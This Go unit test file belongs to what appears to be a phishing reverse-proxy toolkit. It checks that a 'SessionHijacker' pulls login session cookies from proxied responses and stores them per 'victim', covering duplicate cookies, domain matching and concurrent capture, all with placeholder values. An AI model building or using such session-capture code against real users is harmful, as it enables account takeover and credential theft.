package capture

import (
	"net/http"
	"net/url"
	"testing"
	"time"

	"github.com/phantomgate/phantomgate/internal/phishlet"
	"github.com/phantomgate/phantomgate/internal/store"
)

func newTestHijacker() (*SessionHijacker, *store.Store) {
	s := store.NewStore("")
	p := &phishlet.Phishlet{
		Name: "test",
		AuthTokens: []phishlet.AuthToken{
			{Domain: ".example.com", Keys: []string{"SESSION_ID", "AUTH_TOKEN"}},
		},
	}
	return NewSessionHijacker(s, p), s
}

func TestSessionCapture(t *testing.T) {
	sh, s := newTestHijacker()

	resp := &http.Response{
		Header: http.Header{},
		Request: &http.Request{
			URL: &url.URL{Host: "login.example.com"},
		},
	}
	resp.Header.Add("Set-Cookie", "SESSION_ID=abc123; Domain=.example.com; Path=/")
	resp.Header.Add("Set-Cookie", "AUTH_TOKEN=xyz789; Domain=.example.com; Path=/")

	sh.InspectResponse(resp, "victim-1")

	v, ok := s.GetVictim("victim-1")
	if !ok {
		t.Fatal("victim not found")
	}
	if len(v.Sessions) != 1 {
		t.Fatalf("expected 1 session, got %d", len(v.Sessions))
	}
	if v.Sessions[0].Cookies["SESSION_ID"] != "abc123" {
		t.Errorf("expected SESSION_ID=abc123, got %q", v.Sessions[0].Cookies["SESSION_ID"])
	}
}

func TestDuplicateCookiesIgnored(t *testing.T) {
	sh, s := newTestHijacker()

	resp := &http.Response{
		Header: http.Header{},
		Request: &http.Request{
			URL: &url.URL{Host: "login.example.com"},
		},
	}
	resp.Header.Add("Set-Cookie", "SESSION_ID=abc123; Domain=.example.com; Path=/")

	sh.InspectResponse(resp, "victim-1")
	sh.InspectResponse(resp, "victim-1")

	v, _ := s.GetVictim("victim-1")
	if len(v.Sessions) != 1 {
		t.Errorf("duplicate cookies should be ignored, got %d sessions", len(v.Sessions))
	}
}

func TestNonMatchingCookiesIgnored(t *testing.T) {
	sh, s := newTestHijacker()

	resp := &http.Response{
		Header: http.Header{},
		Request: &http.Request{
			URL: &url.URL{Host: "other.com"},
		},
	}
	resp.Header.Add("Set-Cookie", "UNRELATED=value; Domain=.other.com; Path=/")

	sh.InspectResponse(resp, "victim-1")

	_, ok := s.GetVictim("victim-1")
	if ok {
		t.Error("non-matching cookies should not create a victim")
	}
}

func TestDomainMatching(t *testing.T) {
	sh, _ := newTestHijacker()

	tests := []struct {
		cookie string
		token  string
		match  bool
	}{
		{"example.com", "example.com", true},
		{".example.com", "example.com", true},
		{"login.example.com", "example.com", true},
		{"other.com", "example.com", false},
		{"notexample.com", "example.com", false},
	}

	for _, tc := range tests {
		result := sh.domainMatches(tc.cookie, tc.token)
		if result != tc.match {
			t.Errorf("domainMatches(%q, %q) = %v, want %v", tc.cookie, tc.token, result, tc.match)
		}
	}
}

func TestConcurrentSessionCapture(t *testing.T) {
	sh, s := newTestHijacker()
	done := make(chan struct{})

	for i := 0; i < 20; i++ {
		go func(id int) {
			defer func() { done <- struct{}{} }()
			resp := &http.Response{
				Header: http.Header{},
				Request: &http.Request{
					URL: &url.URL{Host: "login.example.com"},
				},
			}
			resp.Header.Add("Set-Cookie", "SESSION_ID=token; Domain=.example.com; Path=/")
			sh.InspectResponse(resp, "concurrent-victim")
		}(i)
	}

	for i := 0; i < 20; i++ {
		<-done
	}

	time.Sleep(10 * time.Millisecond)
	_, ok := s.GetVictim("concurrent-victim")
	if !ok {
		t.Error("victim not found after concurrent captures")
	}
}
